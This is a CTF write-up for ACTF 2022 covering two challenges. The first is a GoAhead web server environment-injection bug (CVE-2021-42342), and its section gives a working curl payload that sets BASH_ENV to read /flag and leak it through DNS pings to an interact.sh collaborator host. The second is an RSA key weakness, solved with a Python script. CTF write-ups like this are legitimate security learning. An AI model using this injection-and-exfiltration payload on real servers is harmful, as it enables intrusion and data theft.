I couldn't dedicate much time to the [ACTF'22](https://adworld.xctf.org.cn/competition/detail?id=186&hash=ba9b2b4c-7265-45ce-aa4b-c917bc5ce1bc.event) so I only looked at the two most solved challenges. One web and one crypto. The level was pretty high.

## Gogogo (Web - 118 solves)

We are given a Dockerfile that installs version 5.1.4 of [GoAhead](https://github.com/embedthis/goahead/), "The most popular little embedded web server", and a small bash CGI script that just prints a welcome and displays the environment variables. 

By searching bugs for that version we find CVE-2021-42342 which allows to set arbitrary environment variables while uploading a file. 

First I tried a public exploit that tries to upload and execute a shared library with `LD_PRELOAD` but couldn't make it work, possibly due to lack of execute permissions. Then I moved to setting `BASH_ENV` and after a little fiddling in a local setup, it worked. We have no wget, curl or netcat in the container, but we have ping, and with the help of a collaborator server we can use it to exfiltrate data via DNS requests.

The exploit:

```bash
curl -v -X POST \
-F $'BASH_ENV=$(ping $(head -c 32 /flag|base64|tr -d "="|tr "/" "."|tr "+" "-").xxx.interact.sh)'  \
http://123.60.84.229:10218/cgi-bin/hello
```

- This sets BASH_ENV to our command. `BASH_ENV=$(ping $(head -c 32 /flag|base64|tr -d "="|tr "/" "."|tr "+" "-").xxx.interact.sh)`
- We read a chunk of characters from the /flag file, base64 encode it, replace problematic characters. `head -c 32 /flag|base64|tr -d "="|tr "/" "."|tr "+" "-"`
- This string is then used as the subdomain for our collaborator `ping encoded-flag.xxx.interact.sh`.
- When resolving the IP address to ping it a DNS request is sent to the DNS server and forwarded to our DNS server.
- We replace back any character necessary, base64 decode and keep getting pieces until we got them all. 

ACTF{s1mple_3nv_1nj3ct1on_and_w1sh_y0u_hav3_a_g00d_tim3_1n_ACTF2022}

After seeing the size of the flag I'm glad I tried ping before going with the time based exfiltration. 

## Impossible RSA (crypto - 114 solves)

We are given a public key, the encrypted flag and the script used to generate the key. From the script we get the following relationship between the private primes `e * q = 1 mod p`. Then there is an integer `0 < k < e` such that `e * q = k * p + 1` and we rearrange to get an expression for `p = (e * q - 1) / k`. Finally replacing into `n = p * q` we get `n = (e * q - 1) * q / k` where `n` and `e` are known from the public key and we can brute force `k` to get one of the primes and divide `n` by it to get the other.

```python
from Crypto.Util.number import *
from Crypto.PublicKey import RSA
import gmpy2
gmpy2.get_context().precision=2048
from base64 import b64decode

key64 = b'MIIBITANBgkqhkiG9w0BAQEFAAOCAQ4AMIIBCQKCAQB+pWAiyLgiiDUmsUJs4sGi\
BJeEwLvitqUvBVtcgPEFK4vO4G6CNAd3JlN8zBqJRBVn1FRlcxGPPXuJgIjMOkyV\
G4vo3mLr/v/pER79JrPgP8E5hShao5rujsue8NUq9+r1dUsnqU3gEiPyZspAG+//\
8P7TW0XcvCy5olRZqkV/QD6dlqjBaufWgTL2iMCtkadXT99ETmmgDVJ/GE51xErz\
pE8poKXjJqnwZEWEjdcqO1RXHKLAcmm3mpQEGbFOXWlb2cqSnKTbtJ0cVQ93y3gA\
mjCCBJrQLulx+5Oyn2+1rkRlHuMSq82DC0qAMvbc/DTjlTVYSC+GvIpEEFR344/5\
AgMBAAE='
keyDER = b64decode(key64)
keyPub = RSA.importKey(keyDER)

cip64 = b'QYkUrwPdlV2j2gjzbJMUp2mJjSbJbBT1mShzPTC10d/3xwec8Q6XqZ82Jvn4V2JtETammSDNBbRc\
Lgr0JhpAAdxqbyU7Z49025Y+PEH9BI6e9Z5B+FnQYPyAiYhDHO6Ory+oH0+0FzWtc3t4OwLBE3jS\
q2fH5MamgZkq8WzjOLZYntXt0ImxG6/YdGh31f+57jvaNeVTZV+BqRN/eCzaLf65k/YhlGd+V0to\
5wj7bqrrzs7tJPC9N16S5IRgTpg3VpOXEkaYuhFMv28Kaekwe5opXz362MpgqitKoclLRUuaQ+Bk\
sTGosFr98bbiauPMTFMZE7k/WXVi9Zn35eYC/g=='
cip = int.from_bytes(b64decode(cip64),'big')

n = n=gmpy2.mpz(keyPub.n)
e = keyPub.e

for k in range(1,65537):
  q = gmpy2.sqrt(n * k // e)
  q = int(q)
  if e * q ** 2 - q == n * k:
    p = n // q
    print("q=", q)
    print("p=", p)
    phi = (p-1) * (q-1)
    d = inverse(e,phi)
    msg = pow(cip,d,n)
    print(int(msg).to_bytes(256, byteorder='big'))
    exit()
```

Originally I was trying to derive `d` directly and getting no where so by the time I came with this solution the CTF had ended and didn't get the points. :( 

ACTF{F1nD1nG_5pEcia1_n_i5_nOt_eA5y}

There were 36 challenges in total and would have liked trying my luck with others since this two were fun and well done. The second tier of challenges had around 20 solves each so again this was not an easy CTF will keep an eye on it for coming years.